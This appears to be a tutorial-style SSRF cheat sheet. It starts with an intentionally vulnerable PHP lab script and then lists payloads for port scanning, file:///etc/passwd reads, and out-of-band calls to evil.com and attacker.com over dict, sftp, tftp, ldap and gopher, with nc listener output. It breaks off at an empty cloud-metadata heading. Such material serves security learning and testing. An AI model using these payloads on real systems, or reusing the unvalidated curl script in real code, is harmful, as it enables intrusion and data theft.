# SSRF
> Server Side Request Forgery (SSRF) is simply an attack where the server will make a request (act like a proxy) for the attacker either to a local or to a remote source and then return a response containing the data resulting from the request.

> We can say that the concept of SSRF is the same as using a proxy or VPN where the user will make a request to a certain resource, then the proxy or VPN Server will make a request to that resource, then return the results to the user who made the request.

From SSRF, various things can be done, such as:

- Local/Remote Port Scan
- Local File Read (using file://)
- Sensitive Data Disclosure (Like Server Ip Behind The WAF)
- Interact with internal apps/service/network
- RCE by chaining services on internal network
- Read Metadata Cloud (AWS, Azure, Google Cloud, Digital Ocean, etc)
- Reflected XSS/CSRF

## Lab Setup

> For the use of the lab in this blog post, only use the simple script below (of course maybe the application in Real World is not as simple as this) and will be deployed on Digital Ocean.
```php
<?php
    $url = $_GET['url'];$curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($curl, CURLOPT_TIMEOUT, 5);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);$data = curl_exec ($curl);if(curl_error($curl)){
        echo curl_error($curl);
    }else{
        echo "<pre>" . $data . "</pre>";
    }
    curl_close ($curl);
?>
```
- Curl was chosen as the requestster for this blog post because curl supports various protocols, so it's good for learning purpose.
- requestster is a function or library that we use to fetch/request of the resource from input URL.
<br></br>

## Local/Remote Port Scanning
> The purpose of scanning a port is simply to be able to map running applications/services behind that port so the attacker can identify what applications/services are running on that port. This becomes very important if the attacker wants to interact and then perform querying to internal applications/services.<br></br>
Port scanning can be done using HTTP, HTTPS, GOPHER, or DICT protocols.

Payload:
```url
vulnerablesite.com/file/?url=http://127.0.0.1:22

vulnerablesite.com/file/?url=http://127.0.0.1:port
vulnerablesite.com/file/?url=http://localhost:port
vulnerablesite.com/file/?url=https://127.0.0.1:port
vulnerablesite.com/file/?url=https://localhost:port
vulnerablesite.com/file/?url=http://[::]:port
vulnerablesite.com/file/?url=http://0000::1:port
```
- If there is a Blind SSRF to find out whether the port is open or closed, you can pay attention to Content-length, Response Time, or HTTP Status Code.
- The indicator to find out, of course, is not just the three elements mentioned above, there could be “unusual” elements that appear during port scanning because it depends on what technology and what environment the web application uses.
- The indicator to find out, of course, is not just the three elements mentioned above, there could be “unusual” elements that appear during port scanning because it depends on what technology and what environment the web application uses.

## Local File Read
> In the context of SSRF accessing/reading Local Files can only use the `file:///` protocol, but not all requeststers support the `file:///` protocol. Besides, there may be a hard filter/blacklist that does not allow the use of that protocol, but still, it depends on the behavior of the requeststers.

- To access the file itself, you can use `file:/PathToFile` , `file:///PathToFile` or `file://hostname/PathToFile`. The three access methods are valid URIs for `file:///`.
```php
vulnerablesite.com/file/?url=file:///etc/passwd
vulnerablesite.com/file/?url=file://path/to/file
vulnerablesite.com/file/?url=file://\/\/etc/passwd
vulnerablesite.com/file/?url=file:///C:/Windows/win.ini
```
- If the web application is deployed on Windows Server, to access files using the `file:///` protocol, you can use `file:///<drive_letter/PathToFile`. Example : `file:///d:/hello.txt`


## Sensitive Data Disclosure
- Sometime when server connect to your malicious server you can get server log and find servers IP. Also you can use server as proxy or vpn.
```php
vulnerablesite.com/file/?url=http://evil.com
vulnerablesite.com/file/?url=https://evil.com
vulnerablesite.com/file/?url=http://Burpcollab
```
- you can fetch real ip with http://dnslog.cn/ (of course, dict protocol can also be used)
```php
vulnerablesite.com/file/?url=http://clmppw.dnslog.cn
vulnerablesite.com/file/?url=dict://clmppw.dnslog.cn:80
```

![image](https://www.fatalerrors.org/images/blog/7c7b1e709329e0005f7baf88dcb4ba95.jpg)
- Or fetch a file from external sites which has malicious payload with content type served as html
```php
vulnerablesite.com/file/?url=http://brutelogic.com.br/poc.svg
```
- The first thing to do when we find an SSRF is to test all the wrapper which are working, if the server blocks one wrapper, go and try another. if it’s your lucky day you might find one wrapper not blacklisted.
```php
file:///
dict://
sftp://
ldap://
tftp://
gopher://
```
- DICT:
    - If the server block http request to external sites or whitelist you could simply use `dict:// -` URL schemas to make a request.
    - DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
        ```php
        vulnerablesite.com/file/?url=dict://evil.com:1337/

        evil.com:$ nc -lvp 1337
        Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 31126)
        CLIENT libcurl 7.40.0
        ```
- SFTP:
    - Sftp stands for SSH File Transfer Protocol, or Secure File Transfer Protocol, is a separate protocol packaged with SSH that works in a similar way over a secure connection.
        ```php
       vulnerablesite.com/file/?url=sftp://evil.com:1337/

        evil.com:$ nc -lvp 1337
        Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 37146)
        SSH-2.0-libssh2_1.4.2
        ```

- LDAP:
    - LDAP stands for Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.
    - `ldap://` or `ldaps://` or `ldapi://`
        ```php
        vulnerablesite.com/file/url=ldap://localhost:1337/%0astats%0aquit
        vulnerablesite.com/file/?url=ldaps://localhost:1337/%0astats%0aquit
        vulnerablesite.com/file/?url=ldapi://localhost:1337/%0astats%0aquit
        ```
        
-  TFTP:
    - Trivial File Transfer Protocol is a simple lockstep File Transfer Protocol which allows a client to get a file from or put a file onto a remote host
        ```php
        vulnerablesite.com/file/?url=tftp://evil.com:1337/TESTUDPPACKET

        evil.com:# nc -lvup 1337
        Listening on [0.0.0.0] (family 0, port 1337)
        TESTUDPPACKEToctettsize0blksize512timeout3
        ```
- GOPHER:
    - Gopher, is a distributed document delivery service. It allows users to explore, search and retrieve information residing on different locations in a seamless fashion.
    - Using this protocol you can specify the ip, port and bytes you want the listener to send. Then, you can basically exploit a SSRF to communicate with any TCP server (but you      need to know how to talk to the service first).
    - Fortunately, you can use https://github.com/tarunkant/Gopherus to already create payloads for several services.
        ```php
        vulnerablesite.com/file/?url=http://attacker.com/gopher.phpgopher.php (host it on acttacker.com):-
        <?php
           header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');
        ?>

        evil.com:# nc -lvp 1337
        Listening on [0.0.0.0] (family 0, port 1337)
        Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 49398)
        Hi
        ssrf
        test
        ```
    - Gopher is classified as a universal protocol, through gopher the attacker can do smuggling to other protocols, besides that gopher also supports the use of newline (\r\n) so     that even though the requestster is not vulnerable to CRLF Injection, the attacker can still perform CRLF Injection because Gopher does support multiline requests.<br></br>
   
         > Gopher protocol can do many things, especially in SSRF. This protocol can be used to attack FTP, Telnet, Redis, Memcache, GET and POST requests in the intranet.
         Gopher protocol is a common and commonly used protocol on the Internet before the emergence of http protocol. In ssrf, gopher protocol is often used to construct post packets      to attack intranet applications. In fact, the construction method is very simple, similar to http protocol.

         > The difference is that the gopher protocol does not have a default port, so you need to specify the web port, and you need to specify the post method. Use %0d%0a for            carriage return.

            * Note that the & separator between the post parameters is also url encoded
            * Basic agreement format: URL:gopher ://<host>:<port>/<gopher-path>_ Followed by TCP data flow

        Some small details about gopher's utilization: 
        ![image](https://programming.vip/images/doc/ec4fca7c6afcd72a91cc2beff6bfb822.jpg)

           - Curl -v checks whether curl supports gopher protocol. nc finds that the data is wrapped, but only ello is displayed, while h disappears. Therefore, we need to add in before       we construct gopher here_ To act as the missing character:

        ![image](https://programming.vip/images/doc/ee05a9e82d0606f39705edf1925ef725.jpg)
        > Note that if you use payload in the address bar, you need to do url encoding again. <br></br>
    
## Interacting With Internal Service
- The real power of SSRF is where the attacker can interact with the internal application/service/network in Local Network, imagine if there is a vulnerable application/service in the internal network where the attacker cannot reach the application/service because it is on a different network, but if there is SSRF vulnerability the Attacker might be able to do that.

    ![image](https://user-images.githubusercontent.com/63053441/132804984-22a8570f-98fb-4f11-a9e3-336b865ba37c.png)

- If the requestster supports the use of the `gopher://` protocol or there may be a CRLF Injection vulnerability, it will allow attackers to interact with various internal services such as `SMTP`, `MySQL`, `Redis`, `Memcached` and so on. Then querying these services to give the desired command, for example, to read local files or even to get RCE.
- Gopher protocol is a common and commonly used protocol on the Internet before the emergence of HTTP protocol, but now gopher protocol has been used less and less. Gopher protocol can be said to be the panacea of SSRF. Using this protocol, you can attack Redis, Mysql, FastCGI, Ftp and so on in the intranet, and also send GET and POST requests. This undoubtedly greatly broadens the attack area of SSRF.

- I understand that it should be very flexible and widely used in some scenarios. By constructing the packets we want to send and using gopher protocol to send, we can achieve the requests we want (I'm talking nonsense, I don't know).

- For example, gopher is used to implement GET request, POST request, redis in Intranet, unauthorized access to MySQL (and various relational databases), MongoDB, Memcache, etc

        * Gopher's default port is 70. If no port is specified, for example gopher://127.0.0.1/_test is sent to port 70 by default
        * It's here_ It's a data connection format, not necessarily_ , any other character is OK. For example, 1 is used as the connection character here:
        root@kali:~# curl gopher://127.0.0.1/1test
        
- Gopher will send the following data part to the corresponding port. The data can be strings or other data request packets, such as GET, POST request, redis, mysql unauthorized access, etc. at the same time, the data part must be url encoded, so that gopher protocol can correctly parse.
- For more details you have this links:<br></br>
    [Exploiting Redis](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html)<br></br>
    [Exploiting Redis](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)<br></br>
    [Exploiting Redis](https://smarx.com/posts/2020/09/ssrf-to-redis-ctf-solution/)<br></br>
    [Exploiting Redis](https://www.fatalerrors.org/a/learning-ssrf-through-ctfhub.html)<br></br>
    [Exploiting Redis](https://www.fatalerrors.org/a/0t511To.html)<br></br>
    [Exploiting MySQL](https://programming.vip/docs/ssrf-uses-gopher-to-attack-mysql-and-intranet.html)<br></br>

## Cloud Metadata
